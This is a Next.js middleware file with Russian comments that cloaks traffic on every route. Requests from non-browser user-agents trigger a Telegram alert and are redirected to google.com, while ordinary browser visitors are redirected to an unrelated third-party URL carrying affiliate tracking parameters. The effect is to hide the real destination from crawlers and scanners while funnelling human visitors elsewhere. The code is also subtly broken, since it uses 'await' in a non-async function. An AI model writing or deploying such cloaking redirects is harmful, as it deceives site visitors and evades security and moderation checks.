import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

export function middleware(req: NextRequest) {
  const ua = req.headers.get("user-agent") || "";

  // "человекоподобные" агенты
  const isHumanLike =
    ua.includes("Mozilla") ||
    ua.includes("Chrome") ||
    ua.includes("Safari") ||
    ua.includes("Firefox") ||
    ua.includes("Edg");

  if (!isHumanLike) {
    // отправляем уведомление в Telegram
    await fetch(
      `https://api.telegram.org/bot${process.env.TG_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TG_CHAT_ID,
          text: `⚠️ Бот без юзер-агента: ${req.nextUrl.href}`,
        }),
      }
    );

    // и потом редиректим куда надо
    return NextResponse.redirect("https://google.com");
  }

  return NextResponse.redirect("https://pqnjj.bestafair.com/?utm_source=da57dc555e50572d&ban=tg&j1=1&s1=4533&s2=2163253");
}

// применяем на все роуты
export const config = {
  matcher: ["/:path*"],
};
